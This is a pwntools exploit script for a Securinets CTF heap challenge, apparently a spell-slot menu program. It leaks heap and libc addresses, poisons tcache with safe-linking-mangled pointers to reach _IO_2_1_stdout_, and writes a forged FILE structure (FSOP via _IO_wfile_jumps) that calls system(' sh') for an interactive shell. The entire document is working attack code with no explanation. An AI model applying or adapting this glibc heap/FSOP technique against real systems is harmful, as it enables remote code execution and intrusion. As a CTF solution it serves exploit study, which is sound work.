#!/usr/bin/env python3

from pwn import *
from subprocess import check_output

exe = ELF('main_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda p, data: p.send(data)
sa = lambda p, msg, data: p.sendafter(msg, data)
sl = lambda p, data: p.sendline(data)
sla = lambda p, msg, data: p.sendlineafter(msg, data)

mangle = lambda val, adrs: \
	(adrs >> 12) ^ val

cmd = f'''
brva 0x1376
brva 0x1A2B
brva 0x1ADA 
brva 0x1693
brva 0x1DC4
brva 0x1B67 
c
''' 
def fsrop(fp=libc.sym._IO_2_1_stdout_, offset=-0x20):
  fs = FileStructure()   
  fs.flags = u64(b' sh\0\0\0\0\0')                    
  fs._lock = libc.sym._IO_stdfile_1_lock 
  fs._wide_data = fp - 0x10
  fs.unknown2 = p64(0)*4 + p64(libc.sym.system) + p64(fp + 0x60)  
  fs.vtable = libc.sym._IO_wfile_jumps + offset
  return bytes(fs) 

def get_pid(name):
    return int(check_output(["pgrep", "-f", "-n", name]))

def GDB():
    if args.DOCKER:
        gdb.attach(pid, exe=exe.path, 
            gdbscript=f"set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe\n" + cmd)
        pause()
    else:
        gdb.attach(p, gdbscript = cmd)
        input()

if args.REMOTE:
    p = remote('pwn-14caf623.p1.securinets.tn', 9091)
elif args.DOCKER:
    p = remote('0', 9090)
    sleep(2)
    pid = get_pid('/home/ctf/challenge')
else:
    p = process([exe.path])


def add(idx, name = b'\x00', effect = b'\x00', mana_cost = 0, cooldown=0, element=0):
    sla(p, b'ce: ', b'1')
    sla(p, b'31): ', b'%d' % idx)
    sa(p, b'name: ', name)
    sa(p, b'effect: ', effect)
    sla(p, b'cost: ', b'%d' % mana_cost)
    sla(p, b'cooldown (in seconds): ', b'%d' % cooldown)
    sla(p, b': ', b'%d' % element)


def delete(idx):
    sla(p, b'ce: ', b'4')
    sla(p, b'31): ', b'%d' % idx)

def edit(idx, name = b'\x00', effect = b'\x00', mana_cost = 0, cooldown=0, element=0):
    sla(p, b'ce: ', b'2')
    sla(p, b'31): ', b'%d' % idx)
    sa(p, b'name: ', name)
    sa(p, b'effect: ', effect)
    sla(p, b'cost: ', b'%d' % mana_cost)
    sla(p, b'cooldown (in seconds): ', b'%d' % cooldown)
    sla(p, b': ', b'%d' % element)

def view(idx):
    sla(p, b'ce: ', b'3')
    p.recvuntil(f"slot {idx}".capitalize().encode())
    p.recvuntil(b'name: '.capitalize())
    return p.recvline().strip()

def feedback(size, payload):
    sla(p, b'ce: ', b'5')
    sla(p, b'back: ', b'%d' % size)
    sa(p, b'back: ', payload)

for i in range(0, 20): add(i)
for i in range(0, 10): delete(i)
heap_base = u64(view(0).ljust(8, b'\x00')) << 12
info('Heap base: ' + hex(heap_base))
sla(p, b'ce: ', b'3'*0x500)
libc.address = u64(view(7).ljust(8, b'\x00')) - 0x203c90
info('Libc base: ' + hex(libc.address))
edit(10, name=p64(0x0) + p64(0x81) + p64(heap_base >> 12))
edit(13, name=p64(0x0) + p64(0x81) + p64(heap_base >> 12))
add(20)
add(21)
delete(21)
delete(20)
GDB()
edit(20, name=p64((heap_base+0x7a0)^(heap_base>>12)))
add(20)
add(21, element=0x101)
delete(11)
add(22)
add(23)
delete(23)
delete(22)
edit(22, name=p64((heap_base+0x920)^(heap_base>>12)))
add(22)
add(23, element=0x101)
delete(14)
edit(14, name=p64((libc.sym._IO_2_1_stdout_)^(heap_base>>12)))
feedback(0xf8, b'A')
feedback(0xf8, fsrop(libc.sym._IO_2_1_stdout_))
p.interactive()
